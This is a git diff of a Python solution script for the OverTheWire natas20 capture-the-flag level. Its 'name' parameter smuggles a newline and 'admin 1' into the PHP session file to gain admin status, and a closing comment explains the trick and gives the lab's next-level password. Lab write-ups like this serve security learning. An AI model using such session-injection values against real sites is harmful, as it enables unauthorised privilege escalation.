@@ -12,12 +12,16 @@ def writeResponse(enumerate = ''):
         
 
 url = 'http://natas20.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas20','eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
+lvl_pass = requests.auth.HTTPBasicAuth('natas20','guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
 my_cookies = {"PHPSESSID":'bac'}
-my_params = {"name":"what", "password":"whatever", "debug":"true"}
-
+my_params = {"name":"someName\nadmin 1", "password":"whatever", "debug":"true"}
+enumerate = ''
 res, soup = make()
-writeResponse()
+res, soup = make()
+with open(f'./response{enumerate}.html', 'w') as browserFile:
+    browserFile.write(soup.prettify())
+
+
 '''
 This one was fucking weird, I solved it by running the above script in the py CLI
 Because I saw that everything in the Session file is read into the $_SESSION array,
@@ -30,5 +34,5 @@ the file, then making another request to read all that OUT of the session file, 
 to 1.
 
 Username: natas21
-Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ 
+Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 
 '''
